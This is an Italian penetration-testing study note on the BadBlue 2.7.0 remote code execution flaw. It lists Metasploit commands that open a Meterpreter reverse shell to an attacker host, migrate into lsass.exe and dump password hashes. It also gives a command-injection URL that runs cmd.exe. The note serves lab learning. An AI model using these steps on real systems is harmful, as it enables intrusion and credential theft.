<a href="https://github.com/Gigidotexe/Penetration_Test_notes/blob/main/README.md"> Back </a>
# CVE-2002-1103 BadBlue

**BadBlue** è un server web per Windows originariamente sviluppato per la condivisione di file su piccola scala. È stato distribuito come freeware nei primi anni 2000 ed è noto per la sua interfaccia semplice e la leggerezza.

Tuttavia, versioni obsolete di BadBlue – in particolare la **versione 2.7.0** – sono affette da una **vulnerabilità critica** che permette l'esecuzione remota di codice (**RCE**) sfruttando una cattiva gestione delle richieste HTTP e delle variabili CGI. Questo lo rende un target interessante nei contesti di penetration testing su macchine legacy o ambienti lab.

---

## Introduzione alla vulnerabilità

Il software BadBlue include un interprete integrato per script **.ext**, che possono eseguire comandi sul sistema. Tuttavia, non esiste un controllo adeguato su ciò che può essere eseguito tramite input remoto.

La vulnerabilità sfrutta il fatto che una richiesta GET/POST opportunamente formattata può iniettare comandi direttamente nel sistema operativo ospitante, ottenendo **completa esecuzione di codice arbitrario** con i privilegi dell’utente che esegue il processo.

La vulnerabilità è stata storicamente catalogata come **CVE-2002-1103**, anche se exploit più moderni si riferiscono spesso a **BadBlue passthru.exe RCE**.

---

## Exploiting con Metasploit

Metasploit offre un modulo dedicato all’exploit RCE di BadBlue:

`use exploit/windows/http/badblue_passthru` ⟶ modulo exploit per il servizio CGI di BadBlue. <br>
`set RHOST <IP>` ⟶ indirizzo della macchina target. <br>
`set RPORT 80` ⟶ porta del server BadBlue. <br>
`set PAYLOAD windows/meterpreter/reverse_tcp` ⟶ payload per ottenere shell. <br>
`set LHOST <KaliIP>` ⟶ IP locale della macchina di attacco. <br>
`set LPORT <Port>` ⟶ porta in ascolto. <br>
`run` ⟶ avvia l’exploit e tenta di ottenere la reverse shell. <br>

Se l’attacco va a buon fine, si riceverà una sessione Meterpreter con i privilegi del processo BadBlue (spesso SYSTEM).

Dopo l’esecuzione e l’apertura di una sessione Meterpreter, si cerca il processo `lsass.exe` (Local Security Authority Subsystem Service), responsabile della gestione delle autenticazioni sul sistema. È proprio all'interno della memoria di questo processo che vengono archiviati gli hash NTLM e le credenziali in chiaro.

`ps | grep lsass` ⟶ Puoi identificare il PID di LSAS 

Una volta ottenuto il PID, si migra il payload di Meterpreter dentro LSASS

`migrate <PID>` ⟶ il PID dev'essere quello di lsass

Verifica che l’utente corrente abbia privilegi SYSTEM

`getuid`

Il risultato atteso dovrebbe essere simile a:
```
Server username: NT AUTHORITY\SYSTEM
```

Il modulo sfrutta il file **passthru.ext**, usato da BadBlue per interpretare e inoltrare richieste.  
Un esempio di URL vulnerabile potrebbe essere:

`http://<IP>/ext.dll?m=passthru&b=cmd.exe+/c+dir`

Con questa richiesta, viene eseguito `cmd.exe /c dir`, mostrando la lista dei file nella directory di lavoro.

---

## Verifica e post-exploitation

Una volta ottenuta la shell:

`getuid` ⟶ verifica l’utente attuale (es. `NT AUTHORITY\\SYSTEM`). <br>
`getprivs` ⟶ elenca i privilegi ottenuti. <br>
`hashdump` ⟶ se possibile, estrae gli hash utente da SAM. <br>
`migrate <PID>` ⟶ consente di migrare ad un processo più stabile. <br>

---
